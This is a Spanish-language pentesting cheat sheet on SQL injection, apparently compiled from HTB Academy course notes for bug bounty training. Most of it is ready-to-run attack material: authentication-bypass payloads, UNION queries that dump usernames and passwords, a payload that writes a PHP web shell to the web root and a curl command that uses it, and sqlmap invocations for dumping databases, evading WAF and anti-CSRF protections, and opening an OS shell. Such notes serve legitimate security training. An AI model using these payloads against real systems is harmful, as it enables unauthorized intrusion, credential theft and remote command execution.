---
title: SQL Injection (manual + sqlmap)
slug: sql-injection
category: techniques
updated: 2026-08-05
summary: "Login bypass, UNION/blind/time-based, extracción/escritura de archivos, sqlmap flags avanzados, bypass WAF/CSRF"
tags: [web, sqli, sqlmap, mysql, union, blind, waf-bypass, csrf-token]
sensitive: false
---

# SQL Injection (manual + sqlmap)

## When to use
Parámetro (GET/POST/Cookie/header) llega crudo a una query SQL. Confirmar con un
carácter simple (`'`) que rompa la sintaxis antes de construir el payload completo.

## Login bypass (manual)
```sql
tom'; -- -
tom' OR '1' = '1' -- -
' OR ID=5)-- -
' or 0=0 #                          -- variante clásica de auth bypass en apps mal codeadas
```

## UNION-based (enumeración manual)
```sql
' UNION SELECT 1,2,3,4-- -                                    -- calibrar nº de columnas
' UNION SELECT 1,user(),3,4-- -                                -- confirmar inyectable + contexto
' UNION SELECT 1,TABLE_SCHEMA,TABLE_NAME,COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='users'-- -
' UNION SELECT 1,username,password,4 FROM users-- -
```

## Post-explotación (MySQL, con FILE priv)
```sql
' UNION SELECT 1,LOAD_FILE("/var/www/html/config.php"),3,4-- -
' UNION SELECT "",'<?php system($_REQUEST["cmd"]); ?>', "", "" INTO OUTFILE '/var/www/html/shell.php'-- -
```
```bash
curl "http://TARGET/shell.php?cmd=id"
```

## Enumeración manual de la DB (con creds directas)
```bash
mysql -h TARGET -P PORT -u root -pPASS
```
```sql
SHOW databases;
USE dbname; SHOW TABLES;
DESCRIBE tablename;
```

## sqlmap — casos base
```bash
sqlmap -u "http://TARGET/page?id=1" --dbs --batch
sqlmap -u "http://TARGET/page?id=1" -D DB --tables --batch
sqlmap -u "http://TARGET/page?id=1" -D DB -T TABLE --dump --batch
sqlmap -u "http://TARGET/" --data 'id=1' --batch --dump                # POST
sqlmap -u "http://TARGET/" -H 'Cookie: id=*' --batch --dump            # inyección vía cookie (marcar con *)
sqlmap -r req.txt --batch --dump                                       # desde archivo de petición capturado (Burp)
```

## sqlmap — tuning y técnica forzada
```bash
sqlmap -u "http://TARGET/?id=*" --level 5 --risk 3 -T tbl --batch --dump   # máxima agresividad
sqlmap -u "http://TARGET/?col=id" --prefix='`)' --batch -T tbl --dump      # prefijo custom para romper sintaxis
sqlmap -u "http://TARGET/?id=1" -T tbl --technique=U --union-cols=5 --dump # forzar UNION + nº columnas
sqlmap -u "http://TARGET/?id=1" -D db -T tbl --search -C style --batch     # buscar columna por nombre parcial
```

## sqlmap — bypass de protecciones (WAF / anti-CSRF)
```bash
sqlmap -u "http://TARGET/?" --data 'id=1&token=VALOR' --csrf-token=token --batch --dump
sqlmap -u "http://TARGET/?id=1&uid=VALOR_ALEATORIO" --randomize=uid --batch --dump   # parámetro que debe variar por request
sqlmap -u "http://TARGET/" --data="id=1" --random-agent --batch --dump
sqlmap -u "http://TARGET/?id=1" --tamper=between -T tbl --batch --dump               # scripts de ofuscación (ver --list-tampers)
```

## sqlmap — OS exploitation
```bash
sqlmap -u "http://TARGET/?id=1" --file-read "/var/www/html/flag.txt" --batch
sqlmap -u "http://TARGET/?id=1" --os-shell --technique=E --batch
```

## Combo real (post/JSON + tamper + time-based, WAF activo)
```bash
sqlmap -r request.req --batch --dump --level 5 --risk 3 --random-agent --tamper=between
```

## Gotchas
- `--batch` acepta todos los defaults (menos interactivo, no bloquea esperando input) — usar siempre en automatización.
- Login bypass con `' OR '1'='1` puede devolver múltiples filas y romper lógica que
  espera un solo usuario — si falla, probar `LIMIT 1` al final o el patrón `' OR ID=N)-- -`.
- Antes de UNION, calibrar el nº exacto de columnas (`ORDER BY N-- -` incrementando N
  hasta error, o `UNION SELECT 1,2,3...` incrementando) — sqlmap lo hace solo con `--technique=U`.
- Cookie/header injection: marcar el punto de inyección con `*` explícitamente si sqlmap
  no lo detecta solo (parámetros fuera de URL/body).
- Time-based blind es la técnica de último recurso cuando no hay diferencia visible en
  la respuesta (`--technique=T`) — mucho más lento, usar `--level 5 --risk 3` con cuidado
  del tiempo total en target reales.
- GraphQL y APIs también son inyectables si el arg de una query cae directo en SQL —
  ver el patrón `UNION SELECT` dentro de un argumento string en [[web-app-attacks]].

## References
- Curso CWES Bug Bounty → 03-WEB → "SQL Injection Fundamentals" + "SQLMap Essentials" (HTB Academy). Notion.
- Relacionado: [[web-app-attacks]], [[xss]], [[web-proxies]], [[password-cracking]]
- HTB Academy: Pentesting WEB (08-SQL Injection Fundamentals, 09-SQLMap Essentials).
